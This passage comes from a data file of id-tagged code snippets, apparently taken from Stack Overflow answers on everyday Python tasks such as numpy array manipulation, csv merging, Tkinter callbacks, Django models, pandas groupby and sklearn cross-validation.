</snippet></ROW><ROW><id>20345555</id><snippet>prd = map(''.join, itertools.product(bS, repeat=len(bS)-1))
</snippet></ROW><ROW><id>20345559</id><snippet>x</snippet></ROW><ROW><id>20345559</id><snippet>y</snippet></ROW><ROW><id>20345559</id><snippet>In [1]: import numpy as np

In [2]: extent = (5530000.0, 5000.0, 0.0, 807000.0, 0.0, -5000.0)
   ...: x_steps = np.array([0,1,2]) * extent[1]
   ...: y_steps = np.array([0,1,2,3]) * extent[-1]
   ...: 

In [3]: x_coords = extent[0] + x_steps + extent[1]/2
   ...: y_coords = extent[3] + y_steps + extent[-1]/2
   ...: 

In [4]: x_coords
Out[4]: array([ 5532500.,  5537500.,  5542500.])

In [5]: y_coords
Out[5]: array([ 804500.,  799500.,  794500.,  789500.])
</snippet></ROW><ROW><id>20345559</id><snippet>product()</snippet></ROW><ROW><id>20345559</id><snippet>In [5]: list(it.product(x_coords, y_coords))
Out[5]: [(5532500.0, 804500.0), (5532500.0, 799500.0), (5532500.0, 794500.0), (5532500.0, 789500.0), (5537500.0, 804500.0), (5537500.0, 799500.0), (5537500.0, 794500.0), (5537500.0, 789500.0), (5542500.0, 804500.0), (5542500.0, 799500.0), (5542500.0, 794500.0), (5542500.0, 789500.0)]
</snippet></ROW><ROW><id>20345559</id><snippet>numpy</snippet></ROW><ROW><id>20345559</id><snippet>In [6]: np.transpose([np.tile(x_coords, len(y_coords)), np.repeat(y_coords, len(x_coords))])
Out[6]: 
array([[ 5532500.,   804500.],
       [ 5537500.,   804500.],
       [ 5542500.,   804500.],
       [ 5532500.,   799500.],
       [ 5537500.,   799500.],
       [ 5542500.,   799500.],
       [ 5532500.,   794500.],
       [ 5537500.,   794500.],
       [ 5542500.,   794500.],
       [ 5532500.,   789500.],
       [ 5537500.,   789500.],
       [ 5542500.,   789500.]])
</snippet></ROW><ROW><id>20345559</id><snippet>In [8]: product.reshape((3,4,2))   # product is the result of the above
Out[8]: 
array([[[ 5532500.,   804500.],
        [ 5537500.,   804500.],
        [ 5542500.,   804500.],
        [ 5532500.,   799500.]],

       [[ 5537500.,   799500.],
        [ 5542500.,   799500.],
        [ 5532500.,   794500.],
        [ 5537500.,   794500.]],

       [[ 5542500.,   794500.],
        [ 5532500.,   789500.],
        [ 5537500.,   789500.],
        [ 5542500.,   789500.]]])
</snippet></ROW><ROW><id>20345559</id><snippet>In [9]: ar = np.zeros((3,4,2), float)
    ...: ar[0] = product[::3]
    ...: ar[1] = product[1::3]
    ...: ar[2] = product[2::3]
    ...: 

In [10]: ar
Out[10]: 
array([[[ 5532500.,   804500.],
        [ 5532500.,   799500.],
        [ 5532500.,   794500.],
        [ 5532500.,   789500.]],

       [[ 5537500.,   804500.],
        [ 5537500.,   799500.],
        [ 5537500.,   794500.],
        [ 5537500.,   789500.]],

       [[ 5542500.,   804500.],
        [ 5542500.,   799500.],
        [ 5542500.,   794500.],
        [ 5542500.,   789500.]]])
</snippet></ROW><ROW><id>20345559</id><snippet>numpy</snippet></ROW><ROW><id>20345559</id><snippet>object</snippet></ROW><ROW><id>20345559</id><snippet>numpy</snippet></ROW><ROW><id>20345559</id><snippet>list</snippet></ROW><ROW><id>20345559</id><snippet>(3,4,2)</snippet></ROW><ROW><id>20345720</id><snippet>next</snippet></ROW><ROW><id>20345720</id><snippet>enumerate</snippet></ROW><ROW><id>20345720</id><snippet>&gt;&gt;&gt; next((i for i,x in enumerate(a) if 'node4' in x), None)
3
</snippet></ROW><ROW><id>20345880</id><snippet>/usr/local/Cellar/flann/1.8.4/share/flann/python</snippet></ROW><ROW><id>20345880</id><snippet>setup.py</snippet></ROW><ROW><id>20345880</id><snippet>python setup.py install</snippet></ROW><ROW><id>20346201</id><snippet>f</snippet></ROW><ROW><id>20346201</id><snippet>mod</snippet></ROW><ROW><id>20346201</id><snippet>f</snippet></ROW><ROW><id>20346258</id><snippet>import re
re.findall(r'&lt;li&gt;&lt;strong&gt;([^&lt;]*)&lt;/strong&gt;&lt;/li&gt;', my_text)
</snippet></ROW><ROW><id>20346355</id><snippet>OneToOne</snippet></ROW><ROW><id>20346355</id><snippet>CMSPlugin</snippet></ROW><ROW><id>20346355</id><snippet>OneToOne</snippet></ROW><ROW><id>20346355</id><snippet>CMSPlugin</snippet></ROW><ROW><id>20346355</id><snippet>Title</snippet></ROW><ROW><id>20346355</id><snippet>class Title(CMSPlugin):
    text = models.CharField(max_length=200)
</snippet></ROW><ROW><id>20346355</id><snippet>CMSPlugin</snippet></ROW><ROW><id>20346355</id><snippet>cmsplugin_ptr</snippet></ROW><ROW><id>20346355</id><snippet>CMSPlugin</snippet></ROW><ROW><id>20346355</id><snippet>Title</snippet></ROW><ROW><id>20346355</id><snippet>Video</snippet></ROW><ROW><id>20346355</id><snippet>class VideoPlugin(CMSPlugin):
    title = models.CharField(max_length=200)
</snippet></ROW><ROW><id>20346355</id><snippet>title</snippet></ROW><ROW><id>20346355</id><snippet>Cannot assign "''": "VideoPlugin.title" must be a "Title" instance</snippet></ROW><ROW><id>20346355</id><snippet>link</snippet></ROW><ROW><id>20346355</id><snippet>class ImageText(CMSPlugin):
      image_text_image = FilerImageField(related_name="image0")
      image_text_link = models.CharField(max_length=255, blank=True)
</snippet></ROW><ROW><id>20346942</id><snippet>command = callback</snippet></ROW><ROW><id>20346942</id><snippet>command=lambda:callback(arg1,arg2)</snippet></ROW><ROW><id>20347353</id><snippet>from math import ceil
def solve(start, end, step):
    #http://stackoverflow.com/a/10986098/846892
    for i in xrange(int(ceil((end-start)/step))):
        yield start + step*i
print list(solve(80.0, 90.0, 0.5))
#[80.0, 80.5, 81.0, 81.5, 82.0, 82.5, 83.0, 83.5, 84.0, 84.5, 85.0, 85.5, 86.0, 86.5, 87.0, 87.5, 88.0, 88.5, 89.0, 89.5]
</snippet></ROW><ROW><id>20347353</id><snippet>NumPy</snippet></ROW><ROW><id>20347353</id><snippet>&gt;&gt;&gt; import numpy as np
&gt;&gt;&gt; np.arange(80., 90., .5)                                                                 
array([ 80. ,  80.5,  81. ,  81.5,  82. ,  82.5,  83. ,  83.5,  84. ,                            
        84.5,  85. ,  85.5,  86. ,  86.5,  87. ,  87.5,  88. ,  88.5,                            
        89. ,  89.5])   
</snippet></ROW><ROW><id>20347457</id><snippet>import os
yourfile = os.listdir("/home/user/Desktop/directory_which_only_contains_this_one_file")[0]
</snippet></ROW><ROW><id>20347479</id><snippet>add</snippet></ROW><ROW><id>20347479</id><snippet>None</snippet></ROW><ROW><id>20347479</id><snippet>None</snippet></ROW><ROW><id>20347479</id><snippet>not seen_add(x)</snippet></ROW><ROW><id>20347479</id><snippet>True</snippet></ROW><ROW><id>20347479</id><snippet>and</snippet></ROW><ROW><id>20347479</id><snippet>seen_add(x)</snippet></ROW><ROW><id>20347479</id><snippet>seen_add(x)</snippet></ROW><ROW><id>20347479</id><snippet>not seen_add(x)</snippet></ROW><ROW><id>20347479</id><snippet>def f7(seq):
    seen=set()
    seen_add=seen.add
    result = []
    for x in seq:
        if x not in seen and not seen_add(x):
            result.append(x)
    return result
</snippet></ROW><ROW><id>20347479</id><snippet>and</snippet></ROW><ROW><id>20347479</id><snippet>seen_add</snippet></ROW><ROW><id>20347479</id><snippet>def f7(seq):
    seen=set()
    result = []
    for x in seq:
        if x not in seen:
            seen.add(x)
            result.append(x)
    return result
</snippet></ROW><ROW><id>20347491</id><snippet>pip install numpy
</snippet></ROW><ROW><id>20347561</id><snippet>d = {1: Logfile1, 2: Logfile2, ...}
curr_file = d[filePointer[0]]
curr_file.write(str(capData[0]))
</snippet></ROW><ROW><id>20347596</id><snippet>main</snippet></ROW><ROW><id>20347596</id><snippet>main()</snippet></ROW><ROW><id>20347687</id><snippet>object</snippet></ROW><ROW><id>20347869</id><snippet>interventionPreventivesVisits = InterventionPreventiveVisit.objects.filter(
    date__range=(self.weekDays[0], self.weekDays[len(self.weekDays)-1])
).select_related("housing"
).prefetch_related("housing__tenants")
</snippet></ROW><ROW><id>20347923</id><snippet>import subprocess
result = subprocess.Popen("./compile_cmd.sh")
text = result.communicate()[0]
returncode = result.returncode
</snippet></ROW><ROW><id>20347959</id><snippet>lsof</snippet></ROW><ROW><id>20347959</id><snippet>lsof</snippet></ROW><ROW><id>20347959</id><snippet>lsof</snippet></ROW><ROW><id>20348130</id><snippet>Tkinter.StringVar</snippet></ROW><ROW><id>20348130</id><snippet>StringVar</snippet></ROW><ROW><id>20348130</id><snippet>trace</snippet></ROW><ROW><id>20348130</id><snippet>StringVar</snippet></ROW><ROW><id>20348130</id><snippet>#!/usr/bin/env python3

from tkinter import *
from tkinter.ttk import *

root = Tk()

text_var = StringVar()
entry = Entry(root, textvariable=text_var)
text_var.trace('w', lambda nm, idx, mode: print(text_var.get()))
entry.grid()

Button(text="Close", command=root.destroy).grid()

root.mainloop()
</snippet></ROW><ROW><id>20348305</id><snippet>DictWriter()</snippet></ROW><ROW><id>20348305</id><snippet>csv.writer()</snippet></ROW><ROW><id>20348305</id><snippet>import csv

with open('combined_file.csv', 'wb') as outcsv:
    writer = csv.writer(outcsv)
    writer.writerow(["Date", "temperature 1", "Temperature 2"])

    with open('t1.csv', 'rb') as incsv:
        reader = csv.reader(incsv)
        writer.writerows(row + [0.0] for row in reader)

    with open('t2.csv', 'rb') as incsv:
        reader = csv.reader(incsv)
        writer.writerows(row[:1] + [0.0] + row[1:] for row in reader)
</snippet></ROW><ROW><id>20348305</id><snippet>import csv

with open('combined_file.csv', 'wb') as outcsv:
    writer = csv.DictWriter(outcsv, fieldnames = ["Date", "temperature 1", "Temperature 2"])
    writer.writeheader()

    with open('t1.csv', 'rb') as incsv:
        reader = csv.reader(incsv)
        writer.writerows({'Date': row[0], 'temperature 1': row[1], 'temperature 2': 0.0} for row in reader)

    with open('t2.csv', 'rb') as incsv:
        reader = csv.reader(incsv)
        writer.writerows({'Date': row[0], 'temperature 1': 0.0, 'temperature 2': row[1]} for row in reader)
</snippet></ROW><ROW><id>20348754</id><snippet>+</snippet></ROW><ROW><id>20348754</id><snippet>/proxy/filter.py?action=ADD&amp;value=%2B/sdsd/&amp;2B&amp;option=URL
</snippet></ROW><ROW><id>20348754</id><snippet>encodeURIComponent()</snippet></ROW><ROW><id>20349152</id><snippet>[name[:-4] for name in list_of_names]
</snippet></ROW><ROW><id>20349152</id><snippet>_new</snippet></ROW><ROW><id>20349152</id><snippet>[name[:-4] if name.endswith('_new') else name for name in list_of_names]
</snippet></ROW><ROW><id>20349424</id><snippet>while True:
    self.send_response(200)
    time.sleep(5)
</snippet></ROW><ROW><id>20349424</id><snippet>do_Post</snippet></ROW><ROW><id>20349424</id><snippet>DefaultHttpClient</snippet></ROW><ROW><id>20349617</id><snippet>from pylab import *

ycoords = [ncount(vector[i:i+n-1]) for i in xrange(length-n+1)]
xcoords = range(length-n+1)

plot(xcoords,ycoords)

show()
</snippet></ROW><ROW><id>20349666</id><snippet>runserver</snippet></ROW><ROW><id>20349833</id><snippet>DAEMON_ARGS="start 10"
</snippet></ROW><ROW><id>20349833</id><snippet>#! env/bin python

import sys
n = sys.argv[2]

import time
sleep(n)
</snippet></ROW><ROW><id>20349897</id><snippet>form</snippet></ROW><ROW><id>20349897</id><snippet>form = br.form
form['account_name'] = "XXX LTD"
form['account_id'] = "30a4f430-5b15-8d7f-632a-52723fb0921a"
br.form = form # &lt;--- here
response = br.submit()
</snippet></ROW><ROW><id>20350018</id><snippet>bind_all</snippet></ROW><ROW><id>20350018</id><snippet>backspace(self, event)</snippet></ROW><ROW><id>20350018</id><snippet>command</snippet></ROW><ROW><id>20350018</id><snippet>backspace(self)</snippet></ROW><ROW><id>20350018</id><snippet>def clearLastDigit(self, event=None):</snippet></ROW><ROW><id>20350018</id><snippet># event=None to use function in command= and in binding
</snippet></ROW><ROW><id>20350018</id><snippet>backspace</snippet></ROW><ROW><id>20350018</id><snippet>command=</snippet></ROW><ROW><id>20350018</id><snippet>def backspace(self):
    self.cancel()
    self.display(len(self.text_box.get())-1)
</snippet></ROW><ROW><id>20350018</id><snippet>backspace</snippet></ROW><ROW><id>20350018</id><snippet>bind_all</snippet></ROW><ROW><id>20350018</id><snippet>def backspace(self, event):
    self.cancel()
    self.display(len(self.text_box.get())-1)
</snippet></ROW><ROW><id>20350018</id><snippet>len(self.text_box.get())-1</snippet></ROW><ROW><id>20350018</id><snippet>self.display(  self.text_box.get()[:-1]  )</snippet></ROW><ROW><id>20350018</id><snippet>command</snippet></ROW><ROW><id>20350018</id><snippet>backspace(self)</snippet></ROW><ROW><id>20350018</id><snippet>def backspace(self):
    text = text_box.get()[:-1]
    if text == "":
        text = "0"
    self.current = text
    self.display( text )
</snippet></ROW><ROW><id>20350026</id><snippet>from mock import Mock

def mock_create_fruit(fruit):
    if fruit not in ('apple', 'banana'):
        raise AssertionError('create_fruit not called with an allowed type, was %s' % (fruit,)
    return type(fruit, (object,), {})()

my.factory.create_fruit = Mock(side_effect=mock_create_fruit) 
</snippet></ROW><ROW><id>20350111</id><snippet>--clear</snippet></ROW><ROW><id>20350111</id><snippet>project</snippet></ROW><ROW><id>20350111</id><snippet>project</snippet></ROW><ROW><id>20350111</id><snippet>nargs='?'</snippet></ROW><ROW><id>20350111</id><snippet>parser.add_argument("project", metavar="projectname",
                    help="Name of the project/shot to use", nargs='?')
</snippet></ROW><ROW><id>20350111</id><snippet>args = parser.parse_args()
if not args.clear and args.project is None:
    parser.error('Please provide a project')
</snippet></ROW><ROW><id>20350111</id><snippet>parser.error()</snippet></ROW><ROW><id>20350111</id><snippet>$ python main.py --clear
Namespace(clear=True, p=None, project=None, s=None, test=None)
$ python main.py
usage: sl [-h] [-p project_name] [-s shot_name] [--clear] [--test TEST]
          [projectname]
sl: error: Please provide a project
</snippet></ROW><ROW><id>20350229</id><snippet>lda.printTopics(k)</snippet></ROW><ROW><id>20350229</id><snippet>k</snippet></ROW><ROW><id>20350525</id><snippet>&lt;div&gt;</snippet></ROW><ROW><id>20350525</id><snippet>next_sibling</snippet></ROW><ROW><id>20350525</id><snippet>from bs4 import BeautifulSoup
import urllib2
import datetime

url1 = 'http://www.salatomatic.com/d/Revesby+17154+Ahlus-Sunnah-Wal-Jamaah-Revesby'

content1 = urllib2.urlopen(url1).read()
soup1 = BeautifulSoup(content1)
div1 = soup1.find('div', {'class':'titleBM'}) #get the div where it's located
pos1 = div1.next_sibling

print datetime.datetime.now(), 'street address:  ' , pos1
</snippet></ROW><ROW><id>20350525</id><snippet>python2 script.py
</snippet></ROW><ROW><id>20350525</id><snippet>2013-12-03 12:55:41.306271 street address:   9-11 Mavis Street, Revesby, New South Wales 2212
</snippet></ROW><ROW><id>20350545</id><snippet>open()</snippet></ROW><ROW><id>20350545</id><snippet>io.open()</snippet></ROW><ROW><id>20350545</id><snippet>newline</snippet></ROW><ROW><id>20350545</id><snippet>import io

with io.open(fn, 'rt', newline='') as f:
    lines = f.readlines()
</snippet></ROW><ROW><id>20350545</id><snippet>newline</snippet></ROW><ROW><id>20350545</id><snippet>.readlines()</snippet></ROW><ROW><id>20350545</id><snippet>None</snippet></ROW><ROW><id>20350545</id><snippet>'\n'</snippet></ROW><ROW><id>20350545</id><snippet>'\r'</snippet></ROW><ROW><id>20350545</id><snippet>'\r\n'</snippet></ROW><ROW><id>20350545</id><snippet>'\n'</snippet></ROW><ROW><id>20350545</id><snippet>''</snippet></ROW><ROW><id>20350545</id><snippet>.readlines()</snippet></ROW><ROW><id>20350545</id><snippet>\n</snippet></ROW><ROW><id>20350545</id><snippet>\r</snippet></ROW><ROW><id>20350545</id><snippet>&gt;&gt;&gt; import io
&gt;&gt;&gt; open('test.txt', 'wb').write('One\nTwo\rThree\r\n')
&gt;&gt;&gt; open('test.txt', 'rb').readlines()
['One\n', 'Two\rThree\r\n']
&gt;&gt;&gt; io.open('test.txt', 'r', newline='').readlines()
[u'One\n', u'Two\r', u'Three\r\n']
</snippet></ROW><ROW><id>20350545</id><snippet>io.open()</snippet></ROW><ROW><id>20350583</id><snippet>def population_growth(self):
    ...
    deathrate = 0
    if self.checkVar.get() == 1:
        deathrate = random.uniform(0.001, 0.00009903)
    rate_of_growth = 0.01113 - deathrate
</snippet></ROW><ROW><id>20350583</id><snippet>def mortality(self):
    if self.checkVar.get() == 1:
        self.deathrate = random.uniform(0.001, 0.00009903)
    else:
        self.deathrate = 0

def population_growth(self):
    ...
    rate_of_growth = 0.01113 - self.deathrate
</snippet></ROW><ROW><id>20350602</id><snippet>tuple(ob.attribute for ob in inputlist)
</snippet></ROW><ROW><id>20350857</id><snippet>if word not in s</snippet></ROW><ROW><id>20350857</id><snippet>from collections import Counter
counts = Counter(s)
</snippet></ROW><ROW><id>20350857</id><snippet>distribution = Counter(counts[v] for v in set(test))
</snippet></ROW><ROW><id>20350857</id><snippet>&gt;&gt;&gt; test = list('abcdef')
&gt;&gt;&gt; s = list('here comes the sun')
&gt;&gt;&gt; counts = Counter(s)
&gt;&gt;&gt; distribution = Counter(counts[v] for v in set(test))
&gt;&gt;&gt; distribution
Counter({0: 4, 1: 1, 4: 1})
</snippet></ROW><ROW><id>20350907</id><snippet>fig, ax = plt.subplots(5, sharex=True, squeeze=True)
</snippet></ROW><ROW><id>20350907</id><snippet>for a in ax:
    # get all the labels of this axis
    labels = ax.get_yticklabels()
    # remove the first and the last labels
    labels[0] = labels[-1] = ""
    # set these new labels
    a.set_yticklabels(labels)
</snippet></ROW><ROW><id>20350907</id><snippet>for a in ax:
    plt.setp(a.get_yticklabels()[0], visible=False)    
    plt.setp(a.get_yticklabels()[-1], visible=False)
</snippet></ROW><ROW><id>20350926</id><snippet>with open('your_file') as fin:
    data = (i for i in fin if not i.isspace())
    for row in data:
        row = next(data)
        # ... do something with every second non empty row
</snippet></ROW><ROW><id>20350926</id><snippet>izip</snippet></ROW><ROW><id>20350926</id><snippet>with open('your_file') as fin:
    for odd, even in zip(*[(i for i in fin if not i.isspace())]*2):
        # ... do something with even
</snippet></ROW><ROW><id>20351061</id><snippet>float</snippet></ROW><ROW><id>20351061</id><snippet>float64</snippet></ROW><ROW><id>20351061</id><snippet>df.astype('float64')
</snippet></ROW><ROW><id>20351061</id><snippet>std()</snippet></ROW><ROW><id>20351061</id><snippet>&gt;&gt;&gt; df = pd.DataFrame({'a':range(10), 'b':range(10,20), 'c':list('abcdefghij'), 'g':[1]*3 + [2]*3 + [3]*4})
&gt;&gt;&gt; df
   a   b  c  g
0  0  10  a  1
1  1  11  b  1
2  2  12  c  1
3  3  13  d  2
4  4  14  e  2
5  5  15  f  2
6  6  16  g  3
7  7  17  h  3
8  8  18  i  3
9  9  19  j  3
&gt;&gt;&gt; df.groupby('g')[['a', 'b']].std()
          a         b
g                    
1  1.000000  1.000000
2  1.000000  1.000000
3  1.290994  1.290994
</snippet></ROW><ROW><id>20351061</id><snippet>std()</snippet></ROW><ROW><id>20351061</id><snippet>aggregation()</snippet></ROW><ROW><id>20351061</id><snippet>groupby</snippet></ROW><ROW><id>20351061</id><snippet>apply()</snippet></ROW><ROW><id>20351061</id><snippet>byhostandop['time'].apply(lambda x: x.std())
</snippet></ROW><ROW><id>20351148</id><snippet>from reportlab.pdfgen import canvas
from reportlab.graphics import renderPDF

c = canvas.Canvas('hi.pdf')

# your drawing
# drawing = Drawing(400, 200)

x, y = 0, 0 # coordinates (from left bottom)
renderPDF.draw(drawing, c, x, y, showBoundary=False)

c.showPage() # to end a page and start a new one

# extra pages content

c.save() # to save :D the whole document
</snippet></ROW><ROW><id>20351212</id><snippet>`data type  Cast to`
`integer    float`
`boolean    object`
`float  no cast`
`object no cast`
</snippet></ROW><ROW><id>20351534</id><snippet>.readlines()</snippet></ROW><ROW><id>20351534</id><snippet>.readline()</snippet></ROW><ROW><id>20351534</id><snippet>s</snippet></ROW><ROW><id>20351534</id><snippet>with open('test.txt','r') as fin:
    for _ in range(5): fin.readline()
    rest = "\n".join(fin.readlines())
</snippet></ROW><ROW><id>20351534</id><snippet>.readlines()</snippet></ROW><ROW><id>20351534</id><snippet>.read()</snippet></ROW><ROW><id>20351534</id><snippet>with open('test.txt','r') as fin:
    for _ in range(5): fin.readline()
    rest = fin.read()
</snippet></ROW><ROW><id>20351534</id><snippet>itertools.islice()</snippet></ROW><ROW><id>20351534</id><snippet>from itertools import islice

with open('test.txt','r') as fin:
    all_but_the_first_five = list(islice(fin, 5, None))
</snippet></ROW><ROW><id>20351534</id><snippet>with open('test.txt','r') as fin:
    for line in list(islice(fin, 5, None)):
        # process line, first 5 will have been skipped
</snippet></ROW><ROW><id>20351534</id><snippet>.readline()</snippet></ROW><ROW><id>20351534</id><snippet>.readline()</snippet></ROW><ROW><id>20351534</id><snippet>.readline()</snippet></ROW><ROW><id>20351679</id><snippet>syns = collections.defaultdict(list)

for w in wordList:
    hash = tuple(w.index(c) for c in w)
    syns[hash].append(w)

print syns.values()
</snippet></ROW><ROW><id>20351912</id><snippet>['ad', 'ad:yahoo', 'visit']</snippet></ROW><ROW><id>20351912</id><snippet>for pattern, repl in patterns:
    m = re.search(pattern, url)
    if m:
        actions.append(m.expand(repl))
</snippet></ROW><ROW><id>20351980</id><snippet>tn.read_some()</snippet></ROW><ROW><id>20351980</id><snippet>tn.read_very_eager()</snippet></ROW><ROW><id>20352002</id><snippet>n = 1000
grid_size = 20

grid = np.arange(n*n).reshape(n,n)
</snippet></ROW><ROW><id>20352002</id><snippet>factor = n / grid_size
yblocks, xblocks = np.array(grid.shape) / factor
</snippet></ROW><ROW><id>20352002</id><snippet>grid</snippet></ROW><ROW><id>20352002</id><snippet>mean</snippet></ROW><ROW><id>20352002</id><snippet>grid_small = grid.reshape(yblocks, factor, xblocks, factor).mean(axis=3).mean(axis=1)
</snippet></ROW><ROW><id>20352002</id><snippet>assert(grid[:factor,:factor].mean() == grid_small[0,0])
assert(grid[-factor:,-factor:].mean() == grid_small[-1,-1])
</snippet></ROW><ROW><id>20352065</id><snippet>fit(X, y)</snippet></ROW><ROW><id>20352065</id><snippet>X</snippet></ROW><ROW><id>20352065</id><snippet>y</snippet></ROW><ROW><id>20352065</id><snippet>scorer(estimator, X, y)</snippet></ROW><ROW><id>20352065</id><snippet>scorer</snippet></ROW><ROW><id>20352065</id><snippet>def scorer(estimator, X, y)
    return ?????  # compute whatever you want, it's up to you to define
                  # what does it mean that estimator is "good" or "bad"
</snippet></ROW><ROW><id>20352065</id><snippet>'mean_squared_error'</snippet></ROW><ROW><id>20352065</id><snippet>'accuracy'</snippet></ROW><ROW><id>20352065</id><snippet>cross_val_score</snippet></ROW><ROW><id>20352065</id><snippet>fit_params</snippet></ROW><ROW><id>20352065</id><snippet>dict</snippet></ROW><ROW><id>20352065</id><snippet>cross_val_score</snippet></ROW><ROW><id>20352065</id><snippet>fit</snippet></ROW><ROW><id>20352065</id><snippet>class my_estimator():
    def fit(X, y, **kwargs):
        alpha = kwargs['alpha']
        beta=X[1,:]+alpha 
        return beta
</snippet></ROW><ROW><id>20352065</id><snippet>import numpy as np
from sklearn.cross_validation import cross_val_score

class RegularizedRegressor:
    def __init__(self, l = 0.01):
        self.l = l

    def combine(self, inputs):
        return sum([i*w for (i,w) in zip([1] + inputs, self.weights)])

    def predict(self, X):
        return [self.combine(x) for x in X]

    def classify(self, inputs):
        return sign(self.predict(inputs))

    def fit(self, X, y, **kwargs):
        self.l = kwargs['l']
        X = np.matrix(X)
        y = np.matrix(y)
        W = (X.transpose() * X).getI() * X.transpose() * y

        self.weights = [w[0] for w in W.tolist()]

    def get_params(self, deep = False):
        return {'l':self.l}

X = np.matrix([[0, 0], [1, 0], [0, 1], [1, 1]])
y = np.matrix([0, 1, 1, 0]).transpose()

print cross_val_score(RegularizedRegressor(), X, y, fit_params={'l':0.1}, scoring = 'mean_squared_error')
</snippet></ROW><ROW><id>20352156</id><snippet>from itertools import islice, izip_longest

with open('input') as fin:
    # Skip header(s) at start
    after5 = islice(fin, 5, None)
    # Take remaining data and group it into groups of 4 lines each... The
    # first 2 are float data, the 3rd is two integers together, and the 4th
    # is the blank line between groups... We use izip_longest to ensure we
    # always have 4 items (padded with None if needs be)...
    for lines in izip_longest(*[iter(after5)] * 4):
            # Convert first two lines to float, and take 3rd line, split it and
            # convert to integers
        print map(float, lines[:2]) + map(int, lines[2].split())

#[0.0, 0.0, 0, 1]
#[0.0, 0.01, 0, 1]
</snippet></ROW><ROW><id>20352265</id><snippet>next()</snippet></ROW><ROW><id>20352265</id><snippet>StopIteration</snippet></ROW><ROW><id>20352265</id><snippet>False</snippet></ROW><ROW><id>20352265</id><snippet>__next__()</snippet></ROW><ROW><id>20352265</id><snippet>StopIteration</snippet></ROW><ROW><id>20352265</id><snippet>StopIteration</snippet></ROW><ROW><id>20352265</id><snippet>False</snippet></ROW><ROW><id>20352265</id><snippet>next(True for item in coll if pred(item))
</snippet></ROW><ROW><id>20352708</id><snippet>ggplot2</snippet></ROW><ROW><id>20352708</id><snippet>dd&lt;-data.frame(obs=1:100,Pred=sample(0:1,100,TRUE),Act=sample(0:1,100,TRUE))

dd$diff&lt;-abs(dd$Pred-dd$Act)
dd$cum&lt;-cumsum(dd$diff)/dd$obs


ggplot(dd) + 
  geom_line(aes(obs,Pred),color="green",linetype=1) +
  geom_line(aes(obs,Act),color="blue",linetype=1) +
  geom_ribbon(aes(obs,ymax=cum,ymin=0),fill="red",color="red",alpha=0.25) +
  geom_point(aes(obs,diff,fill=factor(-diff)),color="white", shape=22,size=5)
</snippet></ROW><ROW><id>20352913</id><snippet>&gt;&gt;&gt; x = 21
&gt;&gt;&gt; y = x
&gt;&gt;&gt; y
21

&gt;&gt;&gt; x = 100
&gt;&gt;&gt; y
21
</snippet></ROW><ROW><id>20352913</id><snippet>&gt;&gt;&gt; x = 21
&gt;&gt;&gt; def do(a):
        x = a + 100  # x here is a new local name, since you've assigned to it.
&gt;&gt;&gt; do(x)
&gt;&gt;&gt; x
21
</snippet></ROW><ROW><id>20352913</id><snippet>&gt;&gt;&gt; x = 21
&gt;&gt;&gt; def p():
        print (x)

&gt;&gt;&gt; p()
21
</snippet></ROW><ROW><id>20352913</id><snippet>&gt;&gt;&gt; x = 21
&gt;&gt;&gt; def do():
        global x
        x = 41
&gt;&gt;&gt; do()
&gt;&gt;&gt; x
41
</snippet></ROW><ROW><id>20352913</id><snippet>immutable</snippet></ROW><ROW><id>20352913</id><snippet>x = 1</snippet></ROW><ROW><id>20352913</id><snippet>x = 21</snippet></ROW><ROW><id>20352913</id><snippet>y = x</snippet></ROW><ROW><id>20352913</id><snippet>x</snippet></ROW><ROW><id>20352913</id><snippet>&gt;&gt;&gt; x = [100]
&gt;&gt;&gt; def do(l):
        l[0] = 50
&gt;&gt;&gt; do(x)
&gt;&gt;&gt; x
[50]
</snippet></ROW><ROW><id>20352913</id><snippet>&gt;&gt;&gt; x = [21]
&gt;&gt;&gt; y = x
&gt;&gt;&gt; x[0] = 50
&gt;&gt;&gt; y
[50]
</snippet></ROW><ROW><id>20352913</id><snippet>.start()</snippet></ROW><ROW><id>20353095</id><snippet>list1 = range(1, 100)
list2 = range(10, 50, 5)

new_values = []

for x in list1:
    for y in list2:
        new_values.append(x*y)
</snippet></ROW><ROW><id>20353181</id><snippet>np.datetime_data</snippet></ROW><ROW><id>20353181</id><snippet>datetime_data(dtype)</snippet></ROW><ROW><id>20353181</id><snippet>     Return (unit, numerator, denominator, events) from a datetime dtype
</snippet></ROW><ROW><id>20353181</id><snippet>np.datetime64</snippet></ROW><ROW><id>20353181</id><snippet>&gt;&gt;&gt; np.dtype([('resource_name', np.str, 100),
...           ('mobile_id_id', np.int),
...           ('value', np.float),
...           ('update_time', np.datetime64),
...           ('capacity', np.int)])
dtype([('resource_name', 'S100'), ('mobile_id_id', '&lt;i8'), ('value', '&lt;f8'), ('update_time', '&lt;M8'), ('capacity', '&lt;i8')])
</snippet></ROW><ROW><id>20353348</id><snippet>xscale("log")</snippet></ROW><ROW><id>20353348</id><snippet>log=True</snippet></ROW><ROW><id>20353348</id><snippet>barh</snippet></ROW><ROW><id>20353348</id><snippet>def graphPlot(data, size=None):
    pos = arange(len(data))+.5    # the bar centers on the y axis
    figure(figsize=size)
    #xscale("log")
    barh(pos, data["n"], align='center', height=0.25, color="darkgrey", log=True)    
    barh(pos - 0.25, data["m"], align='center', height=0.25, color="lightblue", log=True)    
    yticks(pos, data["graph"])
    xlabel("")
    grid(True)
</snippet></ROW><ROW><id>20353348</id><snippet>df[['ser1', 'ser2']].plot(kind='barh', logx=True)</snippet></ROW><ROW><id>20353468</id><snippet>True</snippet></ROW><ROW><id>20353468</id><snippet>&gt;&gt;&gt; bool('foo')
True
&gt;&gt;&gt; bool('')
False
</snippet></ROW><ROW><id>20353468</id><snippet>time_remaining</snippet></ROW><ROW><id>20353468</id><snippet>True</snippet></ROW><ROW><id>20353468</id><snippet>if</snippet></ROW><ROW><id>20353468</id><snippet>time_remaining() == True
</snippet></ROW><ROW><id>20353468</id><snippet>time_remaining</snippet></ROW><ROW><id>20353468</id><snippet>False</snippet></ROW><ROW><id>20353468</id><snippet>None</snippet></ROW><ROW><id>20353468</id><snippet>time_remaining</snippet></ROW><ROW><id>20353468</id><snippet>if</snippet></ROW><ROW><id>20353560</id><snippet>.py</snippet></ROW><ROW><id>20353560</id><snippet>$ cd /script_path
$ python script_name.py
</snippet></ROW><ROW><id>20353682</id><snippet>import copy as cp

DCT = {...}  # You already know what goes here. 

FOUND_PATHS = []            # In case of more than one path to GOAL.
FOUND_REVERSE_PATHS = []

COUNTER = len(DCT)

def back_track(root, target_path = [], counter=COUNTER):
    """
    @param root: DCT key.
    @type root: str.

    @param target_path: Reference to the path we are constructing.
    @type target_path: list.

    """
    global FOUND_PATHS

    # Avoiding cycles.
    if counter == 0:
        return

